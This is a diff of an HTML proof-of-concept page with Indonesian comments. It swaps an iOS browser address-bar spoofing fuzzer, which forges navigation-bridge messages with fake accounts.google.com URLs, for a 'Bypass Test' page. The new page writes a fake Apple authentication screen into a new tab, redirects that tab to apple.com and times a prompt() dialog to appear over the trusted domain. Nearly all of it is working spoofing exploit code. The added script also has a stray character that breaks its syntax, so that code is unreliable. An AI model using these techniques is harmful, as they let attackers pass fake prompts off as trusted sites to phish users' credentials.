@@ -1,354 +1,80 @@
 <!doctype html>
-<html lang="id">
-<head>
-    <meta charset="utf-8">
-    <title>Address Bar Spoofing Harness - Hybrid Pro</title>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=yes"
+    />
+    <title>Bypass Test - Zero</title>
     <style>
-        :root {
-            --bg-color: #05070b;
-            --card-bg: #0f172a;
-            --border-color: #1e293b;
-            --text-main: #f1f5f9;
-            --text-accent: #38bdf8;
-            --accent-red: #dc2626;
-            --accent-green: #16a34a;
-            --accent-purple: #7c3aed;
-            --accent-blue: #2563eb;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            margin: 2em;
-            background: var(--bg-color);
-            color: var(--text-main);
-        }
-
-        .card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.7);
-            margin-bottom: 20px;
-        }
-
-        h1 {
-            color: var(--text-accent);
-            font-size: 20px;
-            margin-top: 0;
-        }
-
-        .target {
-            color: #fca5a5;
-            font-weight: bold;
-        }
-
-        .info {
-            color: var(--text-accent);
-            font-weight: bold;
-        }
-
-        .metric {
-            display: inline-block;
-            background: var(--border-color);
-            padding: 6px 12px;
-            border-radius: 4px;
-            margin-right: 10px;
-            font-family: monospace;
-            font-size: 13px;
-        }
-
-        .input-group {
-            margin-top: 15px;
-            display: flex;
-            gap: 10px;
-        }
-
-        input[type="text"] {
-            flex: 1;
-            background: #020617;
-            border: 1px solid #334155;
-            color: #f8fafc;
-            padding: 10px;
-            border-radius: 6px;
-            font-size: 14px;
-            font-family: monospace;
-        }
-
-        .btn-group {
-            display: flex;
-            gap: 10px;
-            margin-top: 15px;
-            flex-wrap: wrap;
-        }
-
-        button {
-            background: var(--accent-blue);
-            color: white;
-            border: none;
-            padding: 10px 18px;
-            font-size: 14px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: background 0.2s;
-        }
-
-        button:hover {
-            background: #1d4ed8;
-        }
-
-        button.danger {
-            background: var(--accent-red);
-        }
-
-        button.danger:hover {
-            background: #b91c1c;
-        }
-
-        button.purple {
-            background: var(--accent-purple);
-        }
-
-        button.purple:hover {
-            background: #6d28d9;
-        }
-
-        button.green {
-            background: var(--accent-green);
-        }
-
-        button.green:hover {
-            background: #15803d;
-        }
+      body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        background: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      }
+      button {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        padding: 20px 40px;
+        font-size: 20px;
+        background: #007aff;
+        color: #fff;
+        border: none;
+        border-radius: 12px;
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      }
     </style>
-</head>
-<body>
-
-    <div class="card">
-        <h1>Address Bar Spoofing &amp; Mutation Harness</h1>
-        <p>Target Uji: <span class="target">accounts.google.com &amp; example.com</span></p>
-        <p>Status Origin Asli: <code id="real-origin" class="info">Memuat...</code></p>
-        
-        <div>
-            <span class="metric">Terkirim: <span id="stat-sent">0</span></span>
-            <span class="metric">Gagal/Error: <span id="stat-errors">0</span></span>
-            <span class="metric">Status Bridge: <span id="stat-bridge">Menunggu...</span></span>
-        </div>
-
-        <div class="input-group">
-            <input type="text" id="custom-url-input" value="blob:https://accounts.google.com:999999/signin" placeholder="Masukkan URL kustom untuk diuji...">
-            <button id="run-custom" class="green">Uji URL Kustom</button>
-        </div>
-
-        <div class="btn-group">
-            <button id="run-mutation">Jalankan Batch Mutasi</button>
-            <button id="run-flood" class="danger">Flood Test (1,000x Iterasi)</button>
-            <button id="run-reset" class="purple">Reset Statistik</button>
-        </div>
-    </div>
+  </head>
+  <body>
+    <button id="startBtn">TEST BYPASS CLICK HERE</button>
 
     <script>
-    (function() {
-        'use strict';
+      document.getElementById("startBtn").onclick = function () {
+        this.remove();
 
-        let sentCount = 0;
-        let errorCount = 0;
-        let isRunning = false;
+        // Membuka tab baru dan mencoba memaksa fokus atau interaksi langsung
+        const newTab = window.open("about:blank", "_blank");
 
-        function updateStats() {
-            const sentEl = document.getElementById('stat-sent');
-            const errEl = document.getElementById('stat-errors');
-            if (sentEl) sentEl.textContent = sentCount;
-            if (errEl) errEl.textContent = errorCount;
-        }
+        if (newTab) {
+          newTab.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Apple - Official Site</title></head>
+            <body style="margin:0;padding:0;background:#f5f5f7;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
+              <div>
+                <h1 style="font-size:48px;font-weight:600;color:#1d1d1f;margin:0 0 20px 0">Apple Security Verification</h1>
+                <p style="font-size:24px;color:#86868b;margin:0">Please authenticate to continue.</p>
+              </div>
+            </body>
+            </html>
+          `);
+          newTab.document.close();
 
-        const realOriginEl = document.getElementById('real-origin');
-        if (realOriginEl) {
-            realOriginEl.textContent = location.origin || '(opaque)';
-        }
+          // Mempercepat navigasi ke target domain terpercaya
+          setTimeout(() => {
+            newTab.location.href = "https://apple.com";
+          }, 10);
 
-        let mh = null;
-        const hasNativeBridge = window.webkit && 
-                                window.webkit.messageHandlers && 
-                                window.webkit.messageHandlers.NavigationEventMessage;
-        
-        if (hasNativeBridge) {
-            mh = window.webkit.messageHandlers;
-            const bridgeEl = document.getElementById('stat-bridge');
-            if (bridgeEl) bridgeEl.textContent = 'Live iOS Bridge';
-        } else {
-            const bridgeEl = document.getElementById('stat-bridge');
-            if (bridgeEl) bridgeEl.textContent = 'Simulation Mode (Mock)';
-            mh = {
-                NavigationEventMessage: {
-                    postMessage: function(payload) {
-                        console.log("[MOCK POSTMESSAGE]:", payload);
-                    }
-                }
-            };
-        }
-
-        let frameId = "mock-frame-id-999";
-        try {
-            if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
-                frameId = window.__gCrWeb.getFrameId();
-            }
-        } catch (e) {
-            // Abaikan error frameId
-        }
-
-        function generateMutatedVectors() {
-            const baseDomains = ["accounts.google.com", "example.com", "internal.corp", "secure-login.test"];
-            const schemes = ["blob:https://", "blob:http://", "filesystem:https://"];
-            const paths = ["/signin", "/auth", "/oauth/v2/token", "/dashboard", "/../bypass"];
-            
-            const invalidPorts = [
-                ":999999",     
-                ":0",          
-                ":-80",        
-                ":abc",        
-                ":65536",      
-                ":443/extra",  
-                ":"            
-            ];
-
-            let vectors = [];
-            
-            baseDomains.forEach(function(domain) {
-                schemes.forEach(function(scheme) {
-                    paths.forEach(function(path) {
-                        vectors.push(scheme + domain + path);
-                        vectors.push(scheme + "user:pass@" + domain + path);
-                        vectors.push(scheme + domain + "%2f%2e%2e" + path);
-
-                        invalidPorts.forEach(function(port) {
-                            vectors.push(scheme + domain + port + path);
-                            vectors.push(scheme + "user:pass@" + domain + port + path);
-                        });
-                    });
-                });
-            });
-
-            vectors.push("blob:null/opaque-origin-test");
-            vectors.push("data:text/html,<script>console.log('fuzz')</script>");
-            vectors.push("about:blank");
-            
-            return vectors;
-        }
-
-        const mutatedVectors = generateMutatedVectors();
-
-        function sendNavigationMessage(targetUrl, stateObj) {
+          // Menyesuaikan timing penundaan dialog untuk mencari celah race condition setelah tab aktif
+          setTimeout(function () {
             try {
-                if (!mh || !mh.NavigationEventMessage) {
-                    throw new Error("NavigationEventMessage handler tidak tersedia.");
-                }
-
-                mh.NavigationEventMessage.postMessage({
-                    command: 'willChangeState',
-                    frame_id: String(frameId)
-                });
-                
-                mh.NavigationEventMessage.postMessage({
-                    command: 'didReplaceState',
-                    frame_id: String(frameId),
-                    stateObject: JSON.stringify(stateObj || {}),
-                    baseUrl: 'https://x/',
-                    pageUrl: String(targetUrl)
-                });
-                
-                sentCount++;
-                return true;
-            } catch (err) {
-                errorCount++;
-                return false;
+              newTab.prompt("BYPASS ROOT CAUSE VERIFICATION");
+            }V catch(e) {
+              // Fallback jika diblokir oleh patch, uji dengan teknik blocking thread alternatif
+              let start = Date.now();
+              while (Date.now() - start < 2000) {
+                // Busy wait untuk membekukan thread utama jika prompt() gagal
+              }
             }
+          }, 300);
         }
-
-        function executeMutationTest() {
-            if (isRunning) return;
-            isRunning = true;
-            let index = 0;
-
-            function processNext() {
-                if (index < mutatedVectors.length) {
-                    let vector = mutatedVectors[index];
-                    sendNavigationMessage(vector, { mutationIndex: index, timestamp: Date.now() });
-                    index++;
-                    updateStats();
-                    setTimeout(processNext, 15);
-                } else {
-                    isRunning = false;
-                }
-            }
-            processNext();
-        }
-
-        function executeFloodTest() {
-            if (isRunning) return;
-            isRunning = true;
-            let count = 0;
-            const total = 1000;
-
-            function sendBatch() {
-                let limit = Math.min(count + 50, total);
-                for (let i = count; i < limit; i++) {
-                    let v = mutatedVectors[i % mutatedVectors.length] + '?fuzz=' + i;
-                    sendNavigationMessage(v, { floodId: i });
-                }
-                count = limit;
-                updateStats();
-
-                if (count < total) {
-                    setTimeout(sendBatch, 10);
-                } else {
-                    isRunning = false;
-                }
-            }
-            sendBatch();
-        }
-
-        window.addEventListener('DOMContentLoaded', function() {
-            const runCustomBtn = document.getElementById('run-custom');
-            if (runCustomBtn) {
-                runCustomBtn.addEventListener('click', function() {
-                    const customInput = document.getElementById('custom-url-input');
-                    let customUrl = customInput ? customInput.value.trim() : '';
-                    if (!customUrl) {
-                        alert('Masukkan URL target terlebih dahulu!');
-                        return;
-                    }
-                    sendNavigationMessage(customUrl, { customTest: true, time: Date.now() });
-                    updateStats();
-                });
-            }
-
-            const runMutBtn = document.getElementById('run-mutation');
-            if (runMutBtn) {
-                runMutBtn.addEventListener('click', executeMutationTest);
-            }
-
-            const runFloodBtn = document.getElementById('run-flood');
-            if (runFloodBtn) {
-                runFloodBtn.addEventListener('click', executeFloodTest);
-            }
-
-            const runResetBtn = document.getElementById('run-reset');
-            if (runResetBtn) {
-                runResetBtn.addEventListener('click', function() {
-                    sentCount = 0;
-                    errorCount = 0;
-                    isRunning = false;
-                    updateStats();
-                });
-            }
-        });
-
-        setTimeout(executeMutationTest, 1200);
-
-    })();
+      };
     </script>
-
-</body>
+  </body>
 </html>
